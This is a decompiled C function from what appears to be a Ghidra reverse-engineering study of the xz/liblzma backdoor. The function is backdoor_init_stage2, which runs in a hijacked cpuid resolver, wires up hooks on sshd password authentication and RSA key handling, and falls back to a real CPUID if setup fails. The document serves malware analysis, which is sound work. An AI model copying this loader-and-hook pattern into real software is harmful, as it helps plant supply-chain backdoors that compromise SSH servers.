// /home/kali/xzre-ghidra/xzregh/106F30_backdoor_init_stage2.c
// Function: backdoor_init_stage2 @ 0x106F30
// Calling convention: unknown
// Prototype: undefined backdoor_init_stage2(void)


/*
 * AutoDoc: Runs inside the hijacked cpuid resolver. It builds temporary `backdoor_shared_globals_t`,
 * `backdoor_hooks_ctx_t`, and `backdoor_setup_params_t` objects, repeatedly calls
 * `init_hooks_ctx()` until the shared globals are available, and then hands the bundle to
 * `backdoor_setup`. If setup succeeds it never returns (the hooks stay installed); if setup fails
 * it zeroes the GOT context and falls back to issuing a real CPUID so liblzma’s resolver still
 * fulfils glibc’s contract.
 */
#include "xzre_types.h"


undefined8 backdoor_init_stage2(undefined8 *param_1)

{
  int *piVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  undefined8 uVar5;
  long lVar6;
  code **ppcVar7;
  undefined4 *puVar8;
  undefined1 auVar9 [16];
  code *shared_globals;
  code *hooks_ctx;
  undefined8 *setup_params;
  undefined4 local_128 [12];
  code **local_f8;
  undefined4 local_a0 [2];
  code **local_98;
  undefined8 local_90;
  undefined1 local_88 [104];
  undefined8 *local_20;
  
  puVar8 = local_128;
  for (lVar6 = 0x22; lVar6 != 0; lVar6 = lVar6 + -1) {
    *puVar8 = 0;
    puVar8 = puVar8 + 1;
  }
  puVar8 = local_a0;
  for (lVar6 = 0x22; lVar6 != 0; lVar6 = lVar6 + -1) {
    *puVar8 = 0;
    puVar8 = puVar8 + 1;
  }
  shared_globals = mm_answer_authpassword_hook;
  hooks_ctx = hook_EVP_PKEY_set1_RSA;
  setup_params = &global_ctx;
  lzma_check_init(local_88,0);
  ppcVar7 = &shared_globals;
  auVar9 = init_hooks_ctx(local_128);
  do {
    local_90 = auVar9._8_8_;
    if (auVar9._0_4_ == 0) {
      local_98 = ppcVar7;
      local_20 = param_1;
      uVar5 = backdoor_setup(local_a0);
      return uVar5;
    }
    local_f8 = ppcVar7;
    auVar9 = init_hooks_ctx(local_90);
  } while (auVar9._0_4_ != 5);
  *param_1 = 1;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  param_1[4] = 0;
  piVar1 = (int *)cpuid_basic_info(0);
  if (*piVar1 != 0) {
    puVar8 = (undefined4 *)cpuid_Version_info(1);
    uVar2 = puVar8[1];
    uVar3 = puVar8[2];
    uVar4 = puVar8[3];
    *(undefined4 *)(param_1 + 1) = *puVar8;
    *(undefined4 *)(param_1 + 2) = uVar2;
    *(undefined4 *)(param_1 + 3) = uVar4;
    *(undefined4 *)(param_1 + 4) = uVar3;
  }
  return 0;
}

